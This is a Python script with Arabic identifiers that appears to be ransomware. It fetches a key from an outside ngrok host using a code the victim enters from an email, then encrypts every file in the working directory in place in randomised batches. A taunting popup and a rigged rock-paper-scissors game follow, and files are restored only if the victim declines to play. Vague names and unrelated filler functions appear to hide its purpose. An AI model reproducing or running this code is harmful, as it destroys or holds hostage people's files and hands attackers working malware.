import os
import time
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes 
from cryptography.hazmat.backends import default_backend
import requests
import tkinter as tk
from tkinter import simpledialog, messagebox
import hashlib
import random
import time
import tkinter as tk
from tkinter import messagebox, simpledialog

_وضع = "active"

def _احصل_على_المفتاح_من_النقطة(_مسار_عشوائي):
    _رابط_المفتاح = f"https://squirrel-pet-bengal.ngrok-free.app/key/{_مسار_عشوائي}"
    try:
        _استجابة = requests.get(_رابط_المفتاح)
        _استجابة.raise_for_status()
        _مفتاح_خام = _استجابة.text.strip()
        _مفتاح_مجزأ = hashlib.sha256(_مفتاح_خام.encode()).digest()[:16]
        messagebox.showerror("فشل استرجاع المفتاح", "لم يتم استرجاع الشهادة. انتهت المهلة، وكلمة المرور أصبحت غير صالحة.")
        return _مفتاح_مجزأ
    except Exception as _خطأ:
        print(f"فشل استرجاع المفتاح: {_خطأ}")
        return None

def _تشغيل_المتجه(_بيانات_مدخلة: bytes, _رمز_التكوين: bytes) -> bytes:
    _بذرة_العشوائية = os.urandom(12)
    _بذرة_العداد = b'\x00\x00\x00\x00'
    _بذرة_المحرك = _بذرة_العشوائية + _بذرة_العداد

    _جلسة = Cipher(algorithms.AES(_رمز_التكوين), modes.CTR(_بذرة_المحرك), backend=default_backend()).encryptor()
    _كتلة_الإخراج = _جلسة.update(_بيانات_مدخلة) + _جلسة.finalize()
    return _بذرة_العشوائية + _كتلة_الإخراج

def _عكس_المتجه(_كتلة: bytes, _رمز_التكوين: bytes) -> bytes:
    _عشوائية = _كتلة[:12]
    _نص_مشفر = _كتلة[12:]
    _بذرة_العداد = b'\x00\x00\x00\x00'
    _بذرة_المحرك = _عشوائية + _بذرة_العداد

    _جلسة = Cipher(algorithms.AES(_رمز_التكوين), modes.CTR(_بذرة_المحرك), backend=default_backend()).decryptor()
    return _جلسة.update(_نص_مشفر) + _جلسة.finalize()

def _مسح_وتعديل_الأصول(_دليل_الأصول: str, _رمز_التكوين: bytes, _مدة_إجمالية=50.0):
    _مسارات_الملفات = []
    _أحجام_الملفات = []
    _مسار_السكريبت = os.path.abspath(__file__)

    for _مسار_الدليل, _, _أصول in os.walk(_دليل_الأصول):
        for _أصل in _أصول:
            _مسار = os.path.join(_مسار_الدليل, _أصل)
            if os.path.abspath(_مسار) == _مسار_السكريبت:
                continue
            _مسارات_الملفات.append(_مسار)
            _أحجام_الملفات.append(os.path.getsize(_مسار))

    _ملفات_مع_أحجام = list(zip(_مسارات_الملفات, _أحجام_الملفات))
    random.shuffle(_ملفات_مع_أحجام)

    _إجمالي_الملفات = len(_ملفات_مع_أحجام)
    if _إجمالي_الملفات == 0:
        print("لم يتم العثور على ملفات.")
        return

    _إجمالي_الحجم = sum(_حجم for _, _حجم in _ملفات_مع_أحجام)

    _بداية_الوقت = time.time()
    _i = 0
    while _i < _إجمالي_الملفات:
        _حجم_الدفعة = random.randint(2, 5)
        _ملفات_الدفعة = _ملفات_مع_أحجام[_i:_i + _حجم_الدفعة]
        _إجمالي_حجم_الدفعة = sum(_حجم for _, _حجم in _ملفات_الدفعة)

        for _j, (_مسار, _حجم) in enumerate(_ملفات_الدفعة, start=1):
            try:
                with open(_مسار, 'rb') as _f:
                    _بيانات = _f.read()
                _وداعا = _تشغيل_المتجه(_بيانات, _رمز_التكوين)
                with open(_مسار, 'wb') as _f:
                    _f.write(_وداعا)
                print(f"[{_i + _j}/{_إجمالي_الملفات}] وداعا: {_مسار}")
            except Exception:
                print(f"[{_i + _j}/{_إجمالي_الملفات}] فشل: {_مسار}")

        _i += _حجم_الدفعة

        _الوقت_المستغرق = time.time() - _بداية_الوقت
        _الوقت_المتبقي = max(_مدة_إجمالية - _الوقت_المستغرق, 0)
        _تأخير = min((_إجمالي_حجم_الدفعة / _إجمالي_الحجم) * _مدة_إجمالية, _الوقت_المتبقي / ((_إجمالي_الملفات - _i) / _حجم_الدفعة + 1))
        if _i < _إجمالي_الملفات:
            print(f"⏳ تأخير لمدة {_تأخير:.2f} ثانية...\n")
            time.sleep(_تأخير)

def _استعادة_الأصول(_دليل_الأصول: str, _رمز_التكوين: bytes):
    _مسار_السكريبت = os.path.abspath(__file__)

    for _مسار_الدليل, _, _أصول in os.walk(_دليل_الأصول):
        for _أصل in _أصول:
            _مسار_الأصل = os.path.join(_مسار_الدليل, _أصل)
            if os.path.abspath(_مسار_الأصل) == _مسار_السكريبت:
                continue

            try:
                with open(_مسار_الأصل, 'rb') as _f:
                    _كتلة = _f.read()

                _مستعاد = _عكس_المتجه(_كتلة, _رمز_التكوين)

                with open(_مسار_الأصل, 'wb') as _f:
                    _f.write(_مستعاد)
            except Exception:
                pass  

def _عرض_نافذة_منبثقة(_مدة_التشفير=None):
    _جذر = tk.Tk()
    _جذر.withdraw()

    _رسالة = (
        "💀 أوه لا... الملفات اختفت!\n"
        "🎉 مفاجأة! ملفاتك الثمينة الآن في إجازة — بشكل دائم.\n\n"
        "لكن مهلاً، أشعر بالسخاء اليوم...\n"
        "هل ترغب في فرصة *عادلة تمامًا* لاستعادتها؟\n\n"
        "اضغط نعم للعب لعبة\n"
        "اضغط لا لخسارة كل شيء مثل الأسطورة 💀"
    )
    if _مدة_التشفير is not None:
        _رسالة += f"\n\n⏳ استغرق التشفير {_مدة_التشفير:.2f} ثانية."

    _استجابة = messagebox.askquestion("💀 أوه لا... الملفات اختفت!", _رسالة)

    if _استجابة == "yes":
        _لعب_لعبة()
    else:
        global _وضع
        _وضع = "restore"
        messagebox.showinfo("وومب وومب..", "اخترت عدم اللعب. سيتم استعادة ملفاتك فقط لأنك عزيز علينا.")

def _لعب_لعبة():
    global _وضع

    _خيارات = ["rock", "paper", "scissors"]
    _اختيارات_الحاسوب = ["rock", "paper", "scissors"]
    _انتصارات_المستخدم = 0
    _انتصارات_الحاسوب = 0

    for _محاولة in range(1, 11):
        if _انتصارات_المستخدم == 3 or _انتصارات_الحاسوب == 3:
            break

        _اختيار_المستخدم = simpledialog.askstring(
            "حجر، ورقة، مقص 🎮",
            f"الجولة {_محاولة}:\nاختر حجر، ورقة، أو مقص:"
        )
        if not _اختيار_المستخدم or _اختيار_المستخدم.lower().strip() not in _خيارات:
            messagebox.showwarning("❌ اختيار غير صالح", "يرجى اختيار حجر، ورقة، أو مقص.")
            continue

        _اختيار_المستخدم = _اختيار_المستخدم.lower().strip()
        if _اختيار_المستخدم == "rock":
            _اختيار_الحاسوب = _اختيارات_الحاسوب[1]
        elif _اختيار_المستخدم == "paper":
            _اختيار_الحاسوب = _اختيارات_الحاسوب[2]
        elif _اختيار_المستخدم == "scissors":
            _اختيار_الحاسوب = _اختيارات_الحاسوب[0]
        else:
            _اختيار_الحاسوب = random.choice(_اختيارات_الحاسوب)

        if _اختيار_المستخدم == _اختيار_الحاسوب:
            messagebox.showinfo("🤝 تعادل", f"كلاكما اختر {_اختيار_المستخدم}. إنها تعادل!")
        else:
            _انتصارات_الحاسوب += 1
            messagebox.showinfo("💻 الحاسوب يفوز", f"اخترت {_اختيار_المستخدم}، الحاسوب اختار {_اختيار_الحاسوب}. الحاسوب يفوز بهذه الجولة!")

    if _انتصارات_الحاسوب == 3:
        messagebox.showerror("💀 انتهت اللعبة", "خسرت اللعبة. الطريقة الوحيدة لفك التشفير هي اختيار عدم اللعب.")

def _حساب_مجموع_الأرقام(_قائمة):
    return sum(_قائمة)

def _عكس_النص(_نص):
    return _نص[::-1]

def _تحقق_من_الأولية(_عدد):
    if _عدد < 2:
        return False
    for _في in range(2, int(_عدد ** 0.5) + 1):
        if _عدد % _في == 0:
            return False
    return True

def _توليد_كلمة_مرور(_طول):
    _أحرف = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()"
    return ''.join(random.choice(_أحرف) for _ in _طول)

def _حساب_المتوسط(_قائمة):
    return sum(_قائمة) / len(_قائمة) if _قائمة else 0

def _تحويل_إلى_ثنائي(_عدد):
    return bin(_عدد)[2:]

def _تحويل_إلى_عشري(_ثنائي):
    return int(_ثنائي, 2)

def _إزالة_المكرر_من_قائمة(_قائمة):
    return list(set(_قائمة))

def _دمج_القواميس(_قاموس1, _قاموس2):
    return {**_قاموس1, **_قاموس2}

def _توليد_رقم_عشوائي(_حد_أدنى, _حد_أقصى):
    return random.randint(_حد_أدنى, _حد_أقصى)

def _جمع(_عدد1, _عدد2):
    return _عدد1 + _عدد2

def _طرح(_عدد1, _عدد2):
    return _عدد1 - _عدد2

def _ضرب(_عدد1, _عدد2):
    return _عدد1 * _عدد2

def _قسمة(_عدد1, _عدد2):
    if _عدد2 == 0:
        raise ValueError("لا يمكن القسمة على الصفر")
    return _عدد1 / _عدد2

def _رفع_إلى_القوة(_أساس, _أس):
    return _أساس ** _أس

def _جذر_تربيعي(_عدد):
    if _عدد < 0:
        raise ValueError("لا يمكن حساب الجذر التربيعي لعدد سالب")
    return _عدد ** 0.5

def _حساب_النسبة_المئوية(_جزء, _كل):
    if _كل == 0:
        raise ValueError("لا يمكن القسمة على الصفر")
    return (_جزء / _كل) * 100

def _حساب_المعاملات_المثلثية(_زاوية, _دالة):
    import math
    _زاوية_بالراديان = math.radians(_زاوية)
    if _دالة == "sin":
        return math.sin(_زاوية_بالراديان)
    elif _دالة == "cos":
        return math.cos(_زاوية_بالراديان)
    elif _دالة == "tan":
        return math.tan(_زاوية_بالراديان)
    else:
        raise ValueError("دالة مثلثية غير معروفة")

def _حساب_المعاملات_العكسية(_قيمة, _دالة):
    import math
    if _دالة == "asin":
        return math.degrees(math.asin(_قيمة))
    elif _دالة == "acos":
        return math.degrees(math.acos(_قيمة))
    elif _دالة == "atan":
        return math.degrees(math.atan(_قيمة))
    else:
        raise ValueError("دالة عكسية غير معروفة")

def _حساب_اللوغاريتم(_عدد, _أساس=10):
    import math
    if _عدد <= 0:
        raise ValueError("العدد يجب أن يكون أكبر من الصفر")
    return math.log(_عدد, _أساس)

if __name__ == "__main__":
    import time
    _مجلد_الموارد = os.getcwd()

    _جذر = tk.Tk()
    _جذر.withdraw()

    _مسار_عشوائي = simpledialog.askstring("إدخال مطلوب", "أدخل المسار العشوائي (كلمة المرور) المرسل في البريد الإلكتروني:")

    _مفتاح = _احصل_على_المفتاح_من_النقطة(_مسار_عشوائي)
    print(_مفتاح)
    if not _مفتاح:
        messagebox.showerror("خطأ", "فشل استرجاع المفتاح. يرجى التحقق من المسار العشوائي.")
        exit(1)

    if _وضع == "active":
        _بداية = time.time()
        _مسح_وتعديل_الأصول(_مجلد_الموارد, _مفتاح)
        _نهاية = time.time()
        _مدة_التشفير = _نهاية - _بداية
        print(f"انتهى التشفير في {_مدة_التشفير:.2f} ثانية.")
        _عرض_نافذة_منبثقة(_مدة_التشفير)

    if _وضع == "restore":
        _استعادة_الأصول(_مجلد_الموارد, _مفتاح)
        print("تم استعادة الملفات بنجاح.")